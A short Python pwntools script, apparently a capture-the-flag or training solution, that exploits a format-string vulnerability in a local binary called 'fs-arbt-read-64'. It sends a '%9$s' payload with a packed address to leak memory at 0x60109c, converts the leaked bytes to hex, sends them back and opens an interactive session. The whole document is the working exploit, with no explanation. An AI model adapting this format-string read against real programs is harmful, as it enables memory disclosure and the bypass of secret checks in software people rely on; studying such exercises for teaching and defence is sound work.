#!/usr/bin/env python

from pwn import *

p = process("./fs-arbt-read-64")
print(p.recv())
p.sendline("%9$sAAAA" + p64(0x60109c))
data = p.recv()
data = data.split()[1]

conv = str(hex(u32(data[:4])))
p.sendline(conv)

p.interactive()
